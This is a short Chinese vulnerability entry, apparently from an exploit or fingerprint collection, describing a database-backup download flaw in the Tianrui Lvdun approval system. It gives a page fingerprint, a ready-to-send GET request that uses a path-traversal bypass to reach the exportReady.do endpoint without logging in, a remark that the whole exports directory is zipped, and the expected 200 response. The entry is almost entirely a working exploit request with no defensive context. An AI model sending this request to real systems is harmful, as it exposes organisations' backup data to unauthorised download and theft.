# 天锐绿盾审批系统exportReady.do数据库备份下载漏洞

天锐绿盾 ｜ 其他 ｜ —
- **指纹**：`body="location.href=location.href+\"`
- **请求**：`GET /trwfe/login.jsp/.%2e/config/exportReady.do HTTP/1.1`

**Payload**
```
压缩的是整个根目录下的exports目录，因此如果目录存在其他文件也会一并压缩
```
- **响应特征**：200